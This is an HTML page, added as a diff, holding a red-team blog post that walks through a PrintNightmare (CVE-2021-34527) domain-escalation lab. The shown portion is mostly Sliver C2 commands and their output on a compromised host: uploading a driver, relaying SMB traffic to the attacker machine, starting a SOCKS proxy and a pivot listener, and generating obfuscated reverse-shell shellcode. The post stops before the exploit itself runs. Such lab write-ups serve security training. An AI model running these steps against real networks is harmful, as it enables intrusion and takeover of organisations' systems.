@@ -1,0 +1,315 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>4.b Domain Escalation - PrintNightmare | Red Mercury</title>
+  <meta name="author" content="Mostafa Noureldin">
+  
+  <meta name="description" content="Introduction
+
+Enabling remote printing and driver installation, entrusts IT admins with SeLoadDriverPrivilege to install new printer drivers to a remote print spooler. 
+At the end, this turned to be an exploit because it was discovered that any “authenticated” user, not just the trusted, permitted sysadmins, can add any ‘Print Driver’ to Windows and escalate this privilege to become a domain admin.
+ExploitationSharpPrintNightmare  will be used as the tool of trade in this post.
+
+Moreover, this will be build on the same lab infrastructre from previous posts, where an initial access has been gained on a vicitm machine and some users credentials have been compromised."> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="4.b Domain Escalation - PrintNightmare"/>
+  <meta property="og:site_name" content="Red Mercury"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="https://mmnoureldin.github.io/Red-Team/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="https://mmnoureldin.github.io/Red-Team/">Red Mercury</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="https://mmnoureldin.github.io/Red-Team/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="https://mmnoureldin.github.io/Red-Team/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="https://mmnoureldin.github.io/Red-Team/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="https://mmnoureldin.github.io/Red-Team/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 4.b Domain Escalation - PrintNightmare</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><img src="https://mmnoureldin.github.io/Red-Team/2023/08/02/Domain-Escalation-PrintNightmare/printnightmare.png" class="">
+
+<p>Enabling remote printing and driver installation, entrusts IT admins with SeLoadDriverPrivilege to install new printer drivers to a remote print spooler. </p>
+<p>At the end, this turned to be an exploit because it was discovered that any “authenticated” user, not just the trusted, permitted sysadmins, can add any ‘Print Driver’ to Windows and escalate this privilege to become a domain admin.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare" title="" target="">SharpPrintNightmare</a>  will be used as the tool of trade in this post.
+
+<p>Moreover, this will be build on the same lab infrastructre from previous posts, where an initial access has been gained on a vicitm machine and some users credentials have been compromised.</p>
+<span id="more"></span>
+
+<p>We will be using sliver C2 as our C2 server ans we already compromised one host from the target network.</p>
+<p>From here, I wanted to test some of the C2 features such as port forwarding, socks, smb relay and TCP pivots.</p>
+<ol>
+<li><p>Using an already opened session on the compromised target, we will setup an SMB relay from the host to the attacker machine. The reason for this is that I don’t want to host the malicious DLL on the compromised host and I will keep it on the attacker machine.</p>
+</li>
+<li><p>To make this possible, I will use  <a href="https://github.com/MrAle98/Sliver-PortBender" title="" target="">PortBender</a> and upload a driver <code>WinDivert64.sys</code> to forward SMB traffic from port 445 on the victim to our local 445 port on the attacker machine.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; sessions </span><br><span class="line"></span><br><span class="line"> ID         Name             Transport   Remote Address                    Hostname      Username              Operating System   Locale   Last Message                                  Health  </span><br><span class="line">========== ================ =========== ================================= ============= ===================== ================== ======== ============================================= =========</span><br><span class="line"> cdc745c3   DELIGHTED_MAN    http(s)     tcp([::1]:49028)-&gt;192.168.24.22   castelblack   NT AUTHORITY\SYSTEM   windows/amd64      en-US    Sun Jul 16 00:49:20 EET 2023 (1s ago)         [ALIVE] </span><br><span class="line"></span><br><span class="line">sliver &gt; use cdc745c3</span><br><span class="line"></span><br><span class="line">[*] Active session DELIGHTED_MAN (cdc745c3-0984-4ca3-9eeb-429babac5094)</span><br><span class="line"></span><br><span class="line">sliver (DELIGHTED_MAN) &gt; cd Drivers</span><br><span class="line"></span><br><span class="line">[*] C:\Windows\system32\Drivers</span><br><span class="line"></span><br><span class="line">sliver (DELIGHTED_MAN) &gt; upload /root/.sliver-client/extensions/portbender/WinDivert64.sys</span><br><span class="line"></span><br><span class="line">[*] Wrote file to C:\Windows\system32\Drivers\WinDivert64.sys</span><br><span class="line"></span><br><span class="line">sliver (DELIGHTED_MAN) &gt; rportfwd add -b 0.0.0.0:8445 -r 127.0.0.1:445</span><br><span class="line"></span><br><span class="line">[*] Reverse port forwarding 127.0.0.1:445 &lt;- 0.0.0.0:8445</span><br><span class="line"></span><br><span class="line">sliver (DELIGHTED_MAN) &gt; portbender redirect 445 8445</span><br><span class="line"></span><br><span class="line">[*] Successfully executed portbender</span><br><span class="line">[*] Got output:</span><br><span class="line">result: 1 id: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Now the relay has been setup, let’s setup socks to enable pivoting from the attacker machine to the target network through the compromised machine.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sliver (DELIGHTED_MAN) &gt; socks5 start -P 1080</span><br><span class="line"></span><br><span class="line">[*] Started SOCKS5 127.0.0.1 1080  </span><br><span class="line">⚠️  In-band SOCKS proxies can be a little unstable depending on protocol</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Setup a TCP pivot handler.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sliver (DELIGHTED_MAN) &gt; pivots tcp</span><br><span class="line"></span><br><span class="line">[*] Started tcp pivot listener :9898 with id 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Then generate a payload of type shellcode to be used for reverse shell.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sliver (PREMIER_PIPE) &gt; generate --tcp-pivot 192.168.24.22:9898 -f shellcode -s /tmp/</span><br><span class="line"></span><br><span class="line">[*] Generating new windows/amd64 implant binary</span><br><span class="line">[*] Symbol obfuscation is enabled</span><br><span class="line">[*] Build completed in 23s</span><br><span class="line">[*] Encoding shellcode with shikata ga nai ... success!</span><br><span class="line">[*] Implant saved to /tmp/PREMIER_PIPE.bin</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="https://mmnoureldin.github.io/Red-Team/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="https://mmnoureldin.github.io/Red-Team/2023/05/01/Domain-Escalation-Zerologon/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-08-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/">red team<span>8</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/privilege-escalation/">privilege escalation<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1569-002/">T1569.002<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1574-002/">T1574.002<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1068/">T1068<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/CVE-2021-34527/">CVE-2021-34527<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Introduction"><span class="toc-article-text">Introduction</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exploitation"><span class="toc-article-text">Exploitation</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Mostafa Noureldin's Blog
+  
+       
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+  <script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'ZP2ZSuHgipSZfRyU8uTR','2.0.0');
+  </script>
+
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="https://mmnoureldin.github.io/Red-Team/js/jquery.imagesloaded.min.js"></script>
+<script src="https://mmnoureldin.github.io/Red-Team/js/gallery.js"></script>
+<script src="https://mmnoureldin.github.io/Red-Team/js/bootstrap.min.js"></script>
+<script src="https://mmnoureldin.github.io/Red-Team/js/main.js"></script>
+<script src="https://mmnoureldin.github.io/Red-Team/js/search.js"></script> 
+
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "https://mmnoureldin.github.io/Red-Team/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
